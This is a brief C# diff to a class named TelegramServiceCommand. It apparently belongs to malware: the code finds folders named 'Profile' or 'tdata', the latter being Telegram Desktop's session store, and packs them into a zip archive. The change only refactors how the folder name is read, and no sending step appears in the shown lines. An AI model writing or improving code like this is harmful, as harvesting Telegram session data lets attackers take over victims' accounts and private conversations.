@@ -26,7 +26,7 @@ public class TelegramServiceCommand(Client client, DataService data) : ICommand,
                  .Where(x => x is { })
                  .Where(x =>
                  {
-                     string name = x![(x.LastIndexOf('\\') + 1)..];
+                     string name = new DirectoryInfo(x).Name;
                      return name.StartsWith("Profile") || name.StartsWith("tdata");
                  })
                  .SelectPerTask(x => zip.CreateEntries(x));
